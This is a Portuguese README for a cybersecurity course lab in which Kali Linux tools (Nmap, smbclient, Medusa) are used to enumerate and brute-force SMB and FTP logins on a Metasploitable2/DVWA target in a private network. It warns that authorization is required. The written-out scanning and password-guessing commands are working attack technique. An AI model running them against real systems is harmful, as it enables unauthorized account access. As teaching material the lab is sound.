# Brute Force & Enumeração — Hands-On (Kali Linux / DVWA / Metasploitable)

**Resumo**  
Projeto prático realizado no curso *Cibersegurança Santander 2025 (DIO)*. Objetivo: executar técnicas de enumeração e ataques de força bruta em ambiente controlado (Kali Linux + Metasploitable2 / DVWA), documentar os passos e evidências e entregar resultados em repositório público.

---

## 🧭 Objetivos
- Reconhecimento e enumeração de portas/serviços (Nmap).
- Identificação de serviços vulneráveis (FTP, SMB, HTTP).
- Ataques de força bruta em serviços (Medusa/Hydra).
- Validação de acessos com smbclient/ftp.
- Documentar evidências e reproduzir procedimentos em ambiente controlado.

---

## 🛠️ Ambiente utilizado
- Kali Linux (VM) — atacante
- Metasploitable2 / DVWA (VM) — alvo
- Rede privada (VirtualBox Host-Only)
- IP alvo no laboratório: `192.168.56.101`

> **Aviso ético**: este material foi gerado em ambiente controlado e autorizado para fins educacionais. Não execute testes contra sistemas sem permissão escrita.

---

⚙️ Comandos e fluxo usado (exemplos)

Observação: execute estes comandos apenas em ambientes de teste ou com autorização explícita do proprietário do alvo.

1. Reconhecimento (Nmap)

Identifica serviços e versões em portas específicas.

# Scan de versão em portas comuns
nmap -sV -p 21,22,80,139,445,3389 192.168.56.101

2. Enumeração SMB

Lista recursos/compartilhamentos SMB disponíveis no host.

# Listar shares e informações SMB (será solicitado password se necessário)
smbclient -L //192.168.56.101 -U msfadmin

3. Brute-force com Medusa — SMB (exemplo)

Tentativa de autenticação SMB usando wordlists de usuários e senhas.

# medusa: -h host -M módulo -U arquivo_de_usuarios -P arquivo_de_senhas -t threads -n stop_on_success -f dont_show_stats
medusa -h 192.168.56.101 -M smbnt -U users.txt -P pass.txt -t 6 -n -f

Notas:

users.txt e pass.txt devem existir no diretório atual.
-t 6 define 6 threads (ajuste conforme sua infraestrutura).
-n/-f controlam comportamento/output conforme a versão do medusa.

4. Brute-force com Medusa — FTP (exemplo)

Tentativa de autenticação via FTP.

medusa -h 192.168.56.101 -M ftp -U users.txt -P pass.txt -t 6 -n -f

5. Validação de credenciais (conexão manual)

Após encontrar credenciais, valide acesso com clientes nativos.

# Conectar a um share SMB
smbclient //192.168.56.101/msfadmin -U msfadmin

# Conectar via FTP
ftp 192.168.56.101

🔎 Boas práticas e recomendações:
Sempre documente: guarde logs e saída dos scans em /logs (ex.: nmap -oN logs/nmap_scan.txt ...).
Use wordlists públicas testadas (ex.: rockyou.txt) e nomeie claramente (users.txt, pass.txt).
Ajuste threads e timeouts para não derrubar serviços.

Antes de qualquer teste, obtenha autorização por escrito do proprietário do sistema.
